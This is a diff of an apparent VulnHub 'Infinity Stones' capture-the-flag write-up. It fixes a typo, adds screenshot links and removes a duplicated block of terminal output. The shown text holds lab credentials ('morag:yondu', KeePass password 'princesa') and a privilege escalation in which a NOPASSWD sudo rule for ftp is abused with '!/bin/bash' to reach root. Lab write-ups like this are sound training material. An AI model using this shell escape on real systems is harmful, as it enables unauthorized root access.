@@ -1,4 +1,4 @@
-Infininty Stones
+Infinity Stones
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 [+] Content Discovery
@@ -273,6 +273,7 @@ password : princesa
 
 Launching the morag.kdbx file into Keepass and enter the password : princesa
 
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/InfinityStones/infinityStones1.png)
 
 
 
@@ -282,38 +283,15 @@ morag:yondu
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-Logging into the server with the credentials obtained:
+Logging into the server with the credentials obtained.
+
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/InfinityStones/infinityStones2.png)
 
 
 Privilege escalation
 
 
-
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-morag@ubuntu:/$ sudo -l
-sudo -l
-Matching Defaults entries for morag on ubuntu:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User morag may run the following commands on ubuntu:
-    (root) NOPASSWD: /usr/bin/ftp
-morag@ubuntu:/$ sudo /usr/bin/ftp
-sudo /usr/bin/ftp
-ftp> !/bin/bash
-!/bin/bash
-morag@ubuntu:/$ sudo -l
-sudo -l
-Matching Defaults entries for morag on ubuntu:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User morag may run the following commands on ubuntu:
-    (root) NOPASSWD: /usr/bin/ftp
-morag@ubuntu:/$ sudo /usr/bin/ftp
-sudo /usr/bin/ftp
-ftp> !/bin/bash
-!/bin/bash
 morag@ubuntu:/$ sudo -l
 sudo -l
 Matching Defaults entries for morag on ubuntu:
@@ -331,6 +309,8 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/InfinityStones/infinityStones3.png)
 
 
 
